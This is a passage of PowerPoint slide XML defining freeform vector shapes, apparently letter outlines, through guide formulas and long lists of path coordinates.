            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="4909916" y="2161877"/>
                <a:ext cx="145164" cy="129702"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 36 w 169"/>
                  <a:gd name="T1" fmla="*/ 122 h 151"/>
                  <a:gd name="T2" fmla="*/ 37 w 169"/>
                  <a:gd name="T3" fmla="*/ 138 h 151"/>
                  <a:gd name="T4" fmla="*/ 43 w 169"/>
                  <a:gd name="T5" fmla="*/ 143 h 151"/>
                  <a:gd name="T6" fmla="*/ 48 w 169"/>
                  <a:gd name="T7" fmla="*/ 145 h 151"/>
                  <a:gd name="T8" fmla="*/ 53 w 169"/>
                  <a:gd name="T9" fmla="*/ 145 h 151"/>
                  <a:gd name="T10" fmla="*/ 56 w 169"/>
                  <a:gd name="T11" fmla="*/ 147 h 151"/>
                  <a:gd name="T12" fmla="*/ 54 w 169"/>
                  <a:gd name="T13" fmla="*/ 149 h 151"/>
                  <a:gd name="T14" fmla="*/ 52 w 169"/>
                  <a:gd name="T15" fmla="*/ 149 h 151"/>
                  <a:gd name="T16" fmla="*/ 25 w 169"/>
                  <a:gd name="T17" fmla="*/ 149 h 151"/>
                  <a:gd name="T18" fmla="*/ 4 w 169"/>
                  <a:gd name="T19" fmla="*/ 149 h 151"/>
                  <a:gd name="T20" fmla="*/ 0 w 169"/>
                  <a:gd name="T21" fmla="*/ 149 h 151"/>
                  <a:gd name="T22" fmla="*/ 0 w 169"/>
                  <a:gd name="T23" fmla="*/ 147 h 151"/>
                  <a:gd name="T24" fmla="*/ 3 w 169"/>
                  <a:gd name="T25" fmla="*/ 145 h 151"/>
                  <a:gd name="T26" fmla="*/ 12 w 169"/>
                  <a:gd name="T27" fmla="*/ 145 h 151"/>
                  <a:gd name="T28" fmla="*/ 15 w 169"/>
                  <a:gd name="T29" fmla="*/ 142 h 151"/>
                  <a:gd name="T30" fmla="*/ 18 w 169"/>
                  <a:gd name="T31" fmla="*/ 132 h 151"/>
                  <a:gd name="T32" fmla="*/ 20 w 169"/>
                  <a:gd name="T33" fmla="*/ 6 h 151"/>
                  <a:gd name="T34" fmla="*/ 22 w 169"/>
                  <a:gd name="T35" fmla="*/ 2 h 151"/>
                  <a:gd name="T36" fmla="*/ 23 w 169"/>
                  <a:gd name="T37" fmla="*/ 0 h 151"/>
                  <a:gd name="T38" fmla="*/ 25 w 169"/>
                  <a:gd name="T39" fmla="*/ 1 h 151"/>
                  <a:gd name="T40" fmla="*/ 32 w 169"/>
                  <a:gd name="T41" fmla="*/ 6 h 151"/>
                  <a:gd name="T42" fmla="*/ 94 w 169"/>
                  <a:gd name="T43" fmla="*/ 68 h 151"/>
                  <a:gd name="T44" fmla="*/ 136 w 169"/>
                  <a:gd name="T45" fmla="*/ 112 h 151"/>
                  <a:gd name="T46" fmla="*/ 135 w 169"/>
                  <a:gd name="T47" fmla="*/ 26 h 151"/>
                  <a:gd name="T48" fmla="*/ 135 w 169"/>
                  <a:gd name="T49" fmla="*/ 18 h 151"/>
                  <a:gd name="T50" fmla="*/ 132 w 169"/>
                  <a:gd name="T51" fmla="*/ 10 h 151"/>
                  <a:gd name="T52" fmla="*/ 128 w 169"/>
                  <a:gd name="T53" fmla="*/ 9 h 151"/>
                  <a:gd name="T54" fmla="*/ 118 w 169"/>
                  <a:gd name="T55" fmla="*/ 8 h 151"/>
                  <a:gd name="T56" fmla="*/ 115 w 169"/>
                  <a:gd name="T57" fmla="*/ 6 h 151"/>
                  <a:gd name="T58" fmla="*/ 115 w 169"/>
                  <a:gd name="T59" fmla="*/ 5 h 151"/>
                  <a:gd name="T60" fmla="*/ 116 w 169"/>
                  <a:gd name="T61" fmla="*/ 4 h 151"/>
                  <a:gd name="T62" fmla="*/ 120 w 169"/>
                  <a:gd name="T63" fmla="*/ 4 h 151"/>
                  <a:gd name="T64" fmla="*/ 145 w 169"/>
                  <a:gd name="T65" fmla="*/ 4 h 151"/>
                  <a:gd name="T66" fmla="*/ 165 w 169"/>
                  <a:gd name="T67" fmla="*/ 4 h 151"/>
                  <a:gd name="T68" fmla="*/ 169 w 169"/>
                  <a:gd name="T69" fmla="*/ 5 h 151"/>
                  <a:gd name="T70" fmla="*/ 169 w 169"/>
                  <a:gd name="T71" fmla="*/ 6 h 151"/>
                  <a:gd name="T72" fmla="*/ 166 w 169"/>
                  <a:gd name="T73" fmla="*/ 8 h 151"/>
                  <a:gd name="T74" fmla="*/ 160 w 169"/>
                  <a:gd name="T75" fmla="*/ 8 h 151"/>
                  <a:gd name="T76" fmla="*/ 155 w 169"/>
                  <a:gd name="T77" fmla="*/ 13 h 151"/>
                  <a:gd name="T78" fmla="*/ 152 w 169"/>
                  <a:gd name="T79" fmla="*/ 24 h 151"/>
                  <a:gd name="T80" fmla="*/ 151 w 169"/>
                  <a:gd name="T81" fmla="*/ 146 h 151"/>
                  <a:gd name="T82" fmla="*/ 147 w 169"/>
                  <a:gd name="T83" fmla="*/ 151 h 151"/>
                  <a:gd name="T84" fmla="*/ 143 w 169"/>
                  <a:gd name="T85" fmla="*/ 150 h 151"/>
                  <a:gd name="T86" fmla="*/ 139 w 169"/>
                  <a:gd name="T87" fmla="*/ 147 h 151"/>
                  <a:gd name="T88" fmla="*/ 81 w 169"/>
                  <a:gd name="T89" fmla="*/ 92 h 151"/>
                  <a:gd name="T90" fmla="*/ 33 w 169"/>
                  <a:gd name="T91" fmla="*/ 45 h 151"/>
                  <a:gd name="T92" fmla="*/ 36 w 169"/>
                  <a:gd name="T93" fmla="*/ 122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69" h="151">
                    <a:moveTo>
                      <a:pt x="36" y="122"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="36" y="122"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="37" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="43" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="43" y="143"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="48" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="54" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="25" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="149"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="12" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="15" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="138"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="121"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="1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25" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="32" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="68"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="137" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="135" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="133" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="128" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="128" y="9"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="123" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="118" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="118" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="115" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="120" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="145" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="165" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="169" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="169" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="169" y="6"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="166" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="160" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="156" y="10"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="155" y="13"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="153" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="152" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="151" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="151" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="149" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="147" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="147" y="151"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="143" y="150"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="139" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="139" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="81" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="81" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36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9" name="Freeform 142">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{4F95C221-1A9C-42E2-99E5-F7E75B068FC5}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="5058516" y="2162736"/>
                <a:ext cx="116818" cy="127125"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 26 w 136"/>
                  <a:gd name="T1" fmla="*/ 15 h 148"/>
                  <a:gd name="T2" fmla="*/ 18 w 136"/>
                  <a:gd name="T3" fmla="*/ 16 h 148"/>
                  <a:gd name="T4" fmla="*/ 9 w 136"/>
                  <a:gd name="T5" fmla="*/ 19 h 148"/>
                  <a:gd name="T6" fmla="*/ 7 w 136"/>
                  <a:gd name="T7" fmla="*/ 21 h 148"/>
                  <a:gd name="T8" fmla="*/ 4 w 136"/>
                  <a:gd name="T9" fmla="*/ 28 h 148"/>
                  <a:gd name="T10" fmla="*/ 3 w 136"/>
                  <a:gd name="T11" fmla="*/ 29 h 148"/>
                  <a:gd name="T12" fmla="*/ 1 w 136"/>
                  <a:gd name="T13" fmla="*/ 30 h 148"/>
                  <a:gd name="T14" fmla="*/ 0 w 136"/>
                  <a:gd name="T15" fmla="*/ 26 h 148"/>
                  <a:gd name="T16" fmla="*/ 1 w 136"/>
                  <a:gd name="T17" fmla="*/ 15 h 148"/>
                  <a:gd name="T18" fmla="*/ 4 w 136"/>
                  <a:gd name="T19" fmla="*/ 4 h 148"/>
                  <a:gd name="T20" fmla="*/ 7 w 136"/>
                  <a:gd name="T21" fmla="*/ 0 h 148"/>
                  <a:gd name="T22" fmla="*/ 9 w 136"/>
                  <a:gd name="T23" fmla="*/ 0 h 148"/>
                  <a:gd name="T24" fmla="*/ 14 w 136"/>
                  <a:gd name="T25" fmla="*/ 3 h 148"/>
                  <a:gd name="T26" fmla="*/ 116 w 136"/>
                  <a:gd name="T27" fmla="*/ 3 h 148"/>
                  <a:gd name="T28" fmla="*/ 129 w 136"/>
                  <a:gd name="T29" fmla="*/ 3 h 148"/>
                  <a:gd name="T30" fmla="*/ 134 w 136"/>
                  <a:gd name="T31" fmla="*/ 1 h 148"/>
                  <a:gd name="T32" fmla="*/ 136 w 136"/>
                  <a:gd name="T33" fmla="*/ 3 h 148"/>
                  <a:gd name="T34" fmla="*/ 136 w 136"/>
                  <a:gd name="T35" fmla="*/ 5 h 148"/>
                  <a:gd name="T36" fmla="*/ 136 w 136"/>
                  <a:gd name="T37" fmla="*/ 29 h 148"/>
                  <a:gd name="T38" fmla="*/ 134 w 136"/>
                  <a:gd name="T39" fmla="*/ 32 h 148"/>
                  <a:gd name="T40" fmla="*/ 132 w 136"/>
                  <a:gd name="T41" fmla="*/ 30 h 148"/>
                  <a:gd name="T42" fmla="*/ 132 w 136"/>
                  <a:gd name="T43" fmla="*/ 26 h 148"/>
                  <a:gd name="T44" fmla="*/ 130 w 136"/>
                  <a:gd name="T45" fmla="*/ 23 h 148"/>
                  <a:gd name="T46" fmla="*/ 119 w 136"/>
                  <a:gd name="T47" fmla="*/ 16 h 148"/>
                  <a:gd name="T48" fmla="*/ 83 w 136"/>
                  <a:gd name="T49" fmla="*/ 15 h 148"/>
                  <a:gd name="T50" fmla="*/ 83 w 136"/>
                  <a:gd name="T51" fmla="*/ 92 h 148"/>
                  <a:gd name="T52" fmla="*/ 84 w 136"/>
                  <a:gd name="T53" fmla="*/ 133 h 148"/>
                  <a:gd name="T54" fmla="*/ 84 w 136"/>
                  <a:gd name="T55" fmla="*/ 137 h 148"/>
                  <a:gd name="T56" fmla="*/ 88 w 136"/>
                  <a:gd name="T57" fmla="*/ 142 h 148"/>
                  <a:gd name="T58" fmla="*/ 91 w 136"/>
                  <a:gd name="T59" fmla="*/ 144 h 148"/>
                  <a:gd name="T60" fmla="*/ 101 w 136"/>
                  <a:gd name="T61" fmla="*/ 144 h 148"/>
                  <a:gd name="T62" fmla="*/ 105 w 136"/>
                  <a:gd name="T63" fmla="*/ 146 h 148"/>
                  <a:gd name="T64" fmla="*/ 104 w 136"/>
                  <a:gd name="T65" fmla="*/ 148 h 148"/>
                  <a:gd name="T66" fmla="*/ 101 w 136"/>
                  <a:gd name="T67" fmla="*/ 148 h 148"/>
                  <a:gd name="T68" fmla="*/ 68 w 136"/>
                  <a:gd name="T69" fmla="*/ 148 h 148"/>
                  <a:gd name="T70" fmla="*/ 42 w 136"/>
                  <a:gd name="T71" fmla="*/ 148 h 148"/>
                  <a:gd name="T72" fmla="*/ 39 w 136"/>
                  <a:gd name="T73" fmla="*/ 146 h 148"/>
                  <a:gd name="T74" fmla="*/ 39 w 136"/>
                  <a:gd name="T75" fmla="*/ 145 h 148"/>
                  <a:gd name="T76" fmla="*/ 42 w 136"/>
                  <a:gd name="T77" fmla="*/ 144 h 148"/>
                  <a:gd name="T78" fmla="*/ 49 w 136"/>
                  <a:gd name="T79" fmla="*/ 144 h 148"/>
                  <a:gd name="T80" fmla="*/ 53 w 136"/>
                  <a:gd name="T81" fmla="*/ 140 h 148"/>
                  <a:gd name="T82" fmla="*/ 55 w 136"/>
                  <a:gd name="T83" fmla="*/ 133 h 148"/>
                  <a:gd name="T84" fmla="*/ 55 w 136"/>
                  <a:gd name="T85" fmla="*/ 92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36" h="148">
                    <a:moveTo>
                      <a:pt x="55" y="15"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="26" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="26" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="7" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="5" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="29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1" y="15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5" y="0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9" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="34" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="116" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="129" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="129" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="3"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="5"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="136" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="134" y="32"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="30"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="26"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="130" y="23"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="126" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="119" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="108" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="15"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="83" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="84" y="137"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="86" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="88" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="91" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="101" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="101" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="105" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="105" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="104" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="101" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="101" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="68" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="68" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="39" y="148"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="39" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="39" y="146"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="39" y="145"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="42" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="49" y="144"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="142"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="53" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="133"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="116"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="92"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55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20" name="Freeform 143">
                <a:extLst>
                  <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                    <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{073A1604-557E-4A47-ADA5-ADCD750A622A}"/>
                  </a:ext>
                </a:extLst>
              </p:cNvPr>
              <p:cNvSpPr>
                <a:spLocks noEditPoints="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="black">
              <a:xfrm>
                <a:off x="5154719" y="2160159"/>
                <a:ext cx="142586" cy="129702"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 54 w 166"/>
                  <a:gd name="T1" fmla="*/ 103 h 151"/>
                  <a:gd name="T2" fmla="*/ 51 w 166"/>
                  <a:gd name="T3" fmla="*/ 105 h 151"/>
                  <a:gd name="T4" fmla="*/ 41 w 166"/>
                  <a:gd name="T5" fmla="*/ 130 h 151"/>
                  <a:gd name="T6" fmla="*/ 38 w 166"/>
                  <a:gd name="T7" fmla="*/ 141 h 151"/>
                  <a:gd name="T8" fmla="*/ 38 w 166"/>
                  <a:gd name="T9" fmla="*/ 144 h 151"/>
                  <a:gd name="T10" fmla="*/ 42 w 166"/>
                  <a:gd name="T11" fmla="*/ 147 h 151"/>
                  <a:gd name="T12" fmla="*/ 49 w 166"/>
                  <a:gd name="T13" fmla="*/ 147 h 151"/>
                  <a:gd name="T14" fmla="*/ 51 w 166"/>
                  <a:gd name="T15" fmla="*/ 148 h 151"/>
                  <a:gd name="T16" fmla="*/ 51 w 166"/>
                  <a:gd name="T17" fmla="*/ 149 h 151"/>
                  <a:gd name="T18" fmla="*/ 49 w 166"/>
                  <a:gd name="T19" fmla="*/ 151 h 151"/>
                  <a:gd name="T20" fmla="*/ 26 w 166"/>
                  <a:gd name="T21" fmla="*/ 151 h 151"/>
                  <a:gd name="T22" fmla="*/ 4 w 166"/>
                  <a:gd name="T23" fmla="*/ 151 h 151"/>
                  <a:gd name="T24" fmla="*/ 1 w 166"/>
                  <a:gd name="T25" fmla="*/ 151 h 151"/>
                  <a:gd name="T26" fmla="*/ 0 w 166"/>
                  <a:gd name="T27" fmla="*/ 149 h 151"/>
                  <a:gd name="T28" fmla="*/ 3 w 166"/>
                  <a:gd name="T29" fmla="*/ 147 h 151"/>
                  <a:gd name="T30" fmla="*/ 8 w 166"/>
                  <a:gd name="T31" fmla="*/ 147 h 151"/>
                  <a:gd name="T32" fmla="*/ 14 w 166"/>
                  <a:gd name="T33" fmla="*/ 145 h 151"/>
                  <a:gd name="T34" fmla="*/ 21 w 166"/>
                  <a:gd name="T35" fmla="*/ 136 h 151"/>
                  <a:gd name="T36" fmla="*/ 76 w 166"/>
                  <a:gd name="T37" fmla="*/ 8 h 151"/>
                  <a:gd name="T38" fmla="*/ 79 w 166"/>
                  <a:gd name="T39" fmla="*/ 3 h 151"/>
                  <a:gd name="T40" fmla="*/ 83 w 166"/>
                  <a:gd name="T41" fmla="*/ 0 h 151"/>
                  <a:gd name="T42" fmla="*/ 84 w 166"/>
                  <a:gd name="T43" fmla="*/ 2 h 151"/>
                  <a:gd name="T44" fmla="*/ 88 w 166"/>
                  <a:gd name="T45" fmla="*/ 7 h 151"/>
                  <a:gd name="T46" fmla="*/ 140 w 166"/>
                  <a:gd name="T47" fmla="*/ 126 h 151"/>
                  <a:gd name="T48" fmla="*/ 145 w 166"/>
                  <a:gd name="T49" fmla="*/ 136 h 151"/>
                  <a:gd name="T50" fmla="*/ 153 w 166"/>
                  <a:gd name="T51" fmla="*/ 145 h 151"/>
                  <a:gd name="T52" fmla="*/ 157 w 166"/>
                  <a:gd name="T53" fmla="*/ 147 h 151"/>
                  <a:gd name="T54" fmla="*/ 163 w 166"/>
                  <a:gd name="T55" fmla="*/ 147 h 151"/>
                  <a:gd name="T56" fmla="*/ 166 w 166"/>
                  <a:gd name="T57" fmla="*/ 149 h 151"/>
                  <a:gd name="T58" fmla="*/ 166 w 166"/>
                  <a:gd name="T59" fmla="*/ 151 h 151"/>
                  <a:gd name="T60" fmla="*/ 158 w 166"/>
                  <a:gd name="T61" fmla="*/ 151 h 151"/>
                  <a:gd name="T62" fmla="*/ 120 w 166"/>
                  <a:gd name="T63" fmla="*/ 151 h 151"/>
                  <a:gd name="T64" fmla="*/ 114 w 166"/>
                  <a:gd name="T65" fmla="*/ 151 h 151"/>
                  <a:gd name="T66" fmla="*/ 113 w 166"/>
                  <a:gd name="T67" fmla="*/ 149 h 151"/>
                  <a:gd name="T68" fmla="*/ 114 w 166"/>
                  <a:gd name="T69" fmla="*/ 148 h 151"/>
                  <a:gd name="T70" fmla="*/ 116 w 166"/>
                  <a:gd name="T71" fmla="*/ 147 h 151"/>
                  <a:gd name="T72" fmla="*/ 117 w 166"/>
                  <a:gd name="T73" fmla="*/ 143 h 151"/>
                  <a:gd name="T74" fmla="*/ 103 w 166"/>
                  <a:gd name="T75" fmla="*/ 105 h 151"/>
                  <a:gd name="T76" fmla="*/ 100 w 166"/>
